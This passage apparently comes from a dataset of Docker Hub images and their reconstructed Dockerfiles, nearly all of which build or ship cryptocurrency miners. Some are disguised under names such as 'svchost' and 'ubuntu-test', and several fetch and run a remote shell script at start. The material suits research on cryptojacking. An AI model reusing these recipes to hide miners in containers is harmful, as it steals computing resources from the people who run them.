file:e19675c388ad038632bf0cdef7fef5dcf570844fe64ffd4ca8af6017ff046a81 .\nENTRYPOINT ["./xmr-stak --noAMD --noNVIDIA"]'
1xvk/svchost; b'ADD file:25c10b1d1b41d46a1827ad0b0d2389c24df6d31430005ff4e9a2d84ea23ebd42 /\nCMD ["/bin/sh"]\nRUN adduser -S -D -H -h /xmrig mining\nRUN apk --no-cache upgrade && apk --no-cache add openssl-dev git build-base cmake libuv-dev libmicrohttpd-dev && git clone https://github.com/xmrig/xmrig.git && cd xmrig && mkdir build && cmake -DCMAKE_BUILD_TYPE=Release . && make && apk del build-base cmake git\nUSER mining\nWORKDIR /xmrig\nCOPY file:b9438559b1078a87a15f1142ece4d7e77d535b4a6ba2ac47c27c2b89c619d2eb 4443.json\nCOPY file:289ea551ad5c7389db74a0e0a4724311bcbebb536a935cc5ea8e3163c5fd3390 4444.json\nCOPY file:c9136855bf61085b0623c8d96b5e18dc8343138b4c20139f9132c3d162f537a3 4446.json\nCOPY file:6762231ac8ac8d944ab766521a4fee27be5bc9ff39fe1e80784c8a91ea09ef60 4447.json\nENTRYPOINT ["./xmrig"]'
vshyba/stak-aeon; b'ADD file:e4bfe62837f1ab63ccc0dfca8d647b4e2ae4d01db960ad182e067f621ce7dc2a /\nCMD ["/bin/bash"]\nRUN apt-get update && apt-get install -y libmicrohttpd-dev g++ make cmake gcc libssl-dev -t testing\nCOPY dir:369c6afeb43333e39dab94425a3b88deda93a5368c2a08662acc943b95624457 /app\nWORKDIR /app\nRUN cmake . && make\nENTRYPOINT ["/app/bin/xmr-stak-cpu"]\nCMD ["/app/config.txt"]'
pdiogo/ffmpegcc; b'ADD file:39e5bc157a8be63bbb36a142e18b644b0cfff07a8a02b42f7d0c4ee4ba75a5bc /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update && \tapt install git build-essential libbz2-dev cmake libuv1-dev libssl-dev wget gcc g++ -y && \tapt clean &&    \trm -rf /var/lib/apt/lists/*\nRUN wget https://dl.bintray.com/boostorg/release/1.66.0/source/boost_1_66_0.tar.gz     && tar xfz boost_1_66_0.tar.gz     && cd boost_1_66_0     && ./bootstrap.sh --with-libraries=system     && ./b2 link=static runtime-link=static install     && cd .. && rm -rf boost_1_66_0 && rm boost_1_66_0.tar.gz && ldconfig\nRUN git clone https://github.com/Bendr0id/xmrigCC.git && \tcd xmrigCC && \tcmake . -DWITH_CC_SERVER=OFF -DWITH_HTTPD=OFF && \tmake\nCOPY file:bf03ca7cee1b1c9d36cf4b329ff033febb8f753c341ff19082cd13df83e6c4c7 /Dockerfile\nENTRYPOINT ["/xmrigCC/xmrigDaemon"]'
wraith996/sumohashvault7; b'ADD file:f5a2d04c3f3cafada15eb32e4e8d971e48ef11724939c399a8664bf498111e67 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get -qq update     && apt-get install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git wget     && rm -rf /var/lib/apt/lists/*         && cd /opt/     && git clone https://github.com/wraith996/xmr-stak /opt/xmr-stak     && mkdir -p /opt/xmr-stak/build     && cd /opt/xmr-stak/build     && cmake -B/opt/xmr-stak/build -H/opt/xmr-stak/ -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF     && make -C /opt/xmr-stak/build install     && wget -O /opt/xmr-stak/build/bin/sumo.sh https://raw.githubusercontent.com/wraith996/testing/master/sumo.sh     && cd /opt/xmr-stak/build/bin/     && chmod +x /opt/xmr-stak/build/bin/sumo.sh         && apt-get -qq --auto-remove purge $buildDeps\nENTRYPOINT ["/bin/sh -c /opt/xmr-stak/build/bin/sumo.sh"]'
wraith996/sumo9-app; b'ADD file:f5a2d04c3f3cafada15eb32e4e8d971e48ef11724939c399a8664bf498111e67 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get -qq update     && apt-get install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git wget     && rm -rf /var/lib/apt/lists/*         && cd /opt/     && git clone https://github.com/wraith996/xmr-stak /opt/xmr-stak     && mkdir -p /opt/xmr-stak/build     && cd /opt/xmr-stak/build     && cmake -B/opt/xmr-stak/build -H/opt/xmr-stak/ -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF     && make -C /opt/xmr-stak/build install     && wget -O /opt/xmr-stak/build/bin/sumo.sh https://raw.githubusercontent.com/wraith996/testing/master/sumo.sh     && cd /opt/xmr-stak/build/bin/     && chmod +x /opt/xmr-stak/build/bin/sumo.sh         && apt-get -qq --auto-remove purge $buildDeps\nENTRYPOINT ["/bin/sh -c /opt/xmr-stak/build/bin/sumo.sh"]'
wraith996/sumoancap; b'ADD file:f5a2d04c3f3cafada15eb32e4e8d971e48ef11724939c399a8664bf498111e67 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get -qq update     && apt-get install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git wget     && rm -rf /var/lib/apt/lists/*         && cd /opt/     && git clone https://github.com/wraith996/xmr-stak /opt/xmr-stak     && mkdir -p /opt/xmr-stak/build     && cd /opt/xmr-stak/build     && cmake -B/opt/xmr-stak/build -H/opt/xmr-stak/ -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF     && make -C /opt/xmr-stak/build install     && wget -O /opt/xmr-stak/build/bin/sumo.sh https://raw.githubusercontent.com/wraith996/testing/master/sumo.sh     && cd /opt/xmr-stak/build/bin/     && chmod +x /opt/xmr-stak/build/bin/sumo.sh         && apt-get -qq --auto-remove purge $buildDeps\nENTRYPOINT ["/bin/sh -c /opt/xmr-stak/build/bin/sumo.sh"]'
zahlenhelfer/litemine; b'ADD file:f4e6551ac34ab446a297849489a5693d67a7e76c9cb9ed9346d82392c9d9a5fe /\nCMD ["/bin/bash"]\nENV DEBIAN_FRONTEND=noninteractive\nRUN apt-get update && apt-get -yqq install wget python-dev libssl-dev make gcc\nRUN wget -qO- http://sourceforge.net/projects/cpuminer/files/pooler-cpuminer-2.4.5-linux-x86_64.tar.gz/download | tar xzf -\nENTRYPOINT ["/minerd"]'
wraith996/sumothomas; b'ADD file:f5a2d04c3f3cafada15eb32e4e8d971e48ef11724939c399a8664bf498111e67 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get -qq update     && apt-get install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git wget     && rm -rf /var/lib/apt/lists/*         && cd /opt/     && git clone https://github.com/wraith996/xmr-stak /opt/xmr-stak     && mkdir -p /opt/xmr-stak/build     && cd /opt/xmr-stak/build     && cmake -B/opt/xmr-stak/build -H/opt/xmr-stak/ -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF     && make -C /opt/xmr-stak/build install     && wget -O /opt/xmr-stak/build/bin/sumo.sh https://raw.githubusercontent.com/wraith996/testing/master/sumo.sh     && cd /opt/xmr-stak/build/bin/     && chmod +x /opt/xmr-stak/build/bin/sumo.sh         && apt-get -qq --auto-remove purge $buildDeps\nENTRYPOINT ["/bin/sh -c /opt/xmr-stak/build/bin/sumo.sh"]'
nbarriere/etn; b'ADD file:c753df38640ab6e246d9e66f0cef7156b7003976080b1e0b83e5717cd6ef1725 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nLABEL maintainer=NVIDIA CORPORATION <cudatools@nvidia.com>\nRUN NVIDIA_GPGKEY_SUM=d1be581509378368edeec8c1eb2958702feedf3bc3d17011adbf24efacce4ab5 &&     NVIDIA_GPGKEY_FPR=ae09fe4bbd223a84b2ccfce3f60f4b3d7fa2af80 &&     apt-key adv --fetch-keys http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/7fa2af80.pub &&     apt-key adv --export --no-emit-version -a $NVIDIA_GPGKEY_FPR | tail -n +5 > cudasign.pub &&     echo "$NVIDIA_GPGKEY_SUM  cudasign.pub" | sha256sum -c --strict - && rm cudasign.pub &&     echo "deb http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64 /" > /etc/apt/sources.list.d/cuda.list &&     echo "deb http://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1604/x86_64 /" > /etc/apt/sources.list.d/nvidia-ml.list\nENV CUDA_VERSION=9.0.176\nENV CUDA_PKG_VERSION=9-0=9.0.176-1\nRUN apt-get update && apt-get install -y --no-install-recommends         cuda-cudart-$CUDA_PKG_VERSION &&     ln -s cuda-9.0 /usr/local/cuda &&     rm -rf /var/lib/apt/lists/*\nLABEL com.nvidia.volumes.needed=nvidia_driver\nLABEL com.nvidia.cuda.version=9.0.176\nRUN echo "/usr/local/nvidia/lib" >> /etc/ld.so.conf.d/nvidia.conf &&     echo "/usr/local/nvidia/lib64" >> /etc/ld.so.conf.d/nvidia.conf\nENV PATH=/usr/local/nvidia/bin:/usr/local/cuda/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nENV LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64\nENV NVIDIA_VISIBLE_DEVICES=all\nENV NVIDIA_DRIVER_CAPABILITIES=compute,utility\nENV NVIDIA_REQUIRE_CUDA=cuda>=9.0\nLABEL com.nvidia.build.id=59605049 com.nvidia.build.ref=648df373876aa8b52177689ec76913abb3bbc080\nENV GIT_REPOSITORY=https://github.com/fireice-uk/xmr-stak.git\nENV XMRSTAK_CMAKE_FLAGS=-DXMR-STAK_COMPILE=generic -DCUDA_ENABLE=ON -DOpenCL_ENABLE=OFF\nRUN apt-get update     && set -x     && apt-get install -qq --no-install-recommends -y build-essential ca-certificates cmake cuda-core-9-0 git cuda-cudart-dev-9-0 libhwloc-dev libmicrohttpd-dev libssl-dev     && git clone $GIT_REPOSITORY     && cd /xmr-stak     && cmake ${XMRSTAK_CMAKE_FLAGS} .     && make     && cd -     && mv /xmr-stak/bin/* /usr/local/bin/     && rm -rf /xmr-stak     && apt-get purge -y -qq build-essential cmake cuda-core-9-0 git cuda-cudart-dev-9-0 libhwloc-dev libmicrohttpd-dev libssl-dev     && apt-get clean -qq\nVOLUME /mnt\nWORKDIR /mnt\nENTRYPOINT ["/usr/local/bin/xmr-stak"]'
krakenz/gakeaws-none; b'ADD file:2e3a37883f56a4a278bec2931fc9f91fb9ebdaa9047540fe8fde419b84a1701b /\nCMD ["/bin/sh"]\nRUN apk update && apk upgrade && apk add libuv openssl\nCOPY file:8daa0549038b531d05022f89cb111ca04944a1d98c684e835269f5aafcce6f65 /xmrig\nENTRYPOINT ["/xmrig"]'
wnz8/verium; b'ADD file:4c266e490f4101f9726598288c14131a75242836f3eda375923ef1677ea8ab8e /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN set -x     && apt-get update     && apt-get upgrade -y     && apt-get --no-install-recommends install -y libcurl4-openssl-dev libjansson-dev unzip wget     && wget https://github.com/fireworm71/veriumMiner/releases/download/v1.4/cpuminer_1.4_linux_x64_O2_GCC7.zip --no-check-certificate     && unzip cpuminer_1.4_linux_x64_O2_GCC7.zip     && chmod +x cpuminer\nENTRYPOINT ["/cpuminer"]'
wraith996/sumo6-app; b'ADD file:f5a2d04c3f3cafada15eb32e4e8d971e48ef11724939c399a8664bf498111e67 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get -qq update     && apt-get install -y libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev git wget     && rm -rf /var/lib/apt/lists/*         && cd /opt/     && git clone https://github.com/wraith996/xmr-stak /opt/xmr-stak     && mkdir -p /opt/xmr-stak/build     && cd /opt/xmr-stak/build     && cmake -B/opt/xmr-stak/build -H/opt/xmr-stak/ -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF     && make -C /opt/xmr-stak/build install     && wget -O /opt/xmr-stak/build/bin/sumo.sh https://raw.githubusercontent.com/wraith996/testing/master/sumo.sh     && cd /opt/xmr-stak/build/bin/     && chmod +x /opt/xmr-stak/build/bin/sumo.sh         && apt-get -qq --auto-remove purge $buildDeps\nENTRYPOINT ["/bin/sh -c /opt/xmr-stak/build/bin/sumo.sh"]'
tanchao2014/ubuntu-test; b'ADD file:2e3a37883f56a4a278bec2931fc9f91fb9ebdaa9047540fe8fde419b84a1701b /\nCMD ["/bin/sh"]\nRUN apk update && apk upgrade && apk add libuv openssl\nCOPY file:8daa0549038b531d05022f89cb111ca04944a1d98c684e835269f5aafcce6f65 /xmrig\nENTRYPOINT ["/xmrig"]'
ferumflex/karbowanec; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nMAINTAINER FerumFlex<ferumflex@gmail.com>\nRUN apt-get update && apt-get install git automake make libcurl4-openssl-dev gcc -y\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd /cpuminer-multi && ./autogen.sh && CFLAGS="-march=native" ./configure && make\nENTRYPOINT ["/cpuminer-multi/minerd"]\nCMD ["-a cryptonight -o stratum+tcp://pool.karbowanec.com:3333 -u KZtmADAJrNce9XX67xmHKZBoewPMkSR8hiWTy6udjypca6nw1SsK9CigBnvNrJcd2SD5au2jWuMngGU8C9KfBXdSQbM2bLY -p x"]'
tobym42/footest; b'ADD file:592c2540de1c707636622213ee30ff5b6f8be0a48bb25c97edc7204ea4df1a81 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nLABEL maintainer=NVIDIA CORPORATION <cudatools@nvidia.com>\nRUN apt-get update && apt-get install -y --no-install-recommends ca-certificates apt-transport-https gnupg-curl &&     rm -rf /var/lib/apt/lists/* &&     NVIDIA_GPGKEY_SUM=d1be581509378368edeec8c1eb2958702feedf3bc3d17011adbf24efacce4ab5 &&     NVIDIA_GPGKEY_FPR=ae09fe4bbd223a84b2ccfce3f60f4b3d7fa2af80 &&     apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/7fa2af80.pub &&     apt-key adv --export --no-emit-version -a $NVIDIA_GPGKEY_FPR | tail -n +5 > cudasign.pub &&     echo "$NVIDIA_GPGKEY_SUM  cudasign.pub" | sha256sum -c 